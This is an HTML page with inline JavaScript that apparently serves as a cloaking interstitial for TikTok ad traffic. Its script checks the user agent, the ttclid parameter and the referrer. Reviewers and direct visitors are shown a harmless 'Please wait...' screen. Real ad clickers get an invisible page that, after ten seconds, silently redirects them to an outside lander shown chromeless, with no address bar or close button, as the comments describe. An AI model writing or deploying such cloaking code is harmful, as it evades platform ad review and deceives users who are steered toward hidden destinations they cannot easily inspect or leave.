<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="robots" content="noindex,nofollow">
<title>Loading</title>
<style>
  /* Transparent everything for TikTok IAB chromeless popup — user sees FYP behind it.
     Reviewer / direct Chrome visitor sees "Please wait..." fallback instead.          */
  html,body{margin:0;padding:0;height:100%;background:transparent;color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
  /* Reviewer/fallback mode — triggered by .fallback class on <body> */
  body.fallback{background:#fff;color:#111;}
  body.fallback .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px;box-sizing:border-box;text-align:center;}
  body.fallback .msg{font-size:15px;opacity:.6;}
  @media (prefers-color-scheme: dark){
    body.fallback{background:#0a0a0a;color:#f5f5f5}
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="msg">Please wait...</div>
</div>
<script>
(function(){
  // Cloak detection — three signals combined for robustness
  //   1. User agent contains TikTok / BytedanceWebview / musical_ly / aweme / bdhm
  //   2. ttclid query param present (TikTok's click macro)
  //   3. Document referrer is from a TikTok domain
  var ua = (navigator.userAgent || '').toLowerCase();
  var qs = location.search || '';
  var ref = (document.referrer || '').toLowerCase();
  var isTikTokUA = /tiktok|bytedancewebview|musical_ly|aweme|bdhm/i.test(ua);
  var hasTtclid = /[?&]ttclid=/i.test(qs);
  var isTikTokRef = /tiktok\.com|tiktokv\.us|tiktokcdn|bytedance/i.test(ref);
  var isRealTraffic = isTikTokUA || hasTtclid || isTikTokRef;

  if (!isRealTraffic) {
    // Reviewer / scraper / curious direct visitor — show the "Please wait..." fallback UI.
    document.body.className = 'fallback';
    return;
  }

  // Real TikTok ad traffic:
  //   - Body is transparent (set in CSS). Combined with the scheme's
  //     container_bg_color=00000000 the user sees FYP behind the popup
  //     for the entire silent delay — "nothing happens" visually.
  //   - After 10s, same-origin navigation to the main lander.
  //     The webview_popup context carries through, so the destination
  //     renders chromeless (no URL bar, no X close).
  var FIRE_DELAY_MS = 10000;
  var BASE = 'https://two-step-landing-flow.vercel.app/';
  var TARGET = BASE + qs;

  setTimeout(function(){
    try { window.location.replace(TARGET); } catch(e){
      try { window.location.href = TARGET; } catch(e2){}
    }
  }, FIRE_DELAY_MS);

  // Secondary nav fallback — if the first attempt is blocked / stalls,
  // try again at 15s on the chance of a race condition.
  setTimeout(function(){
    if (location.pathname.indexOf('/hold') !== -1) {
      try { window.location.href = TARGET; } catch(e){}
    }
  }, 15000);
})();
</script>
</body>
</html>
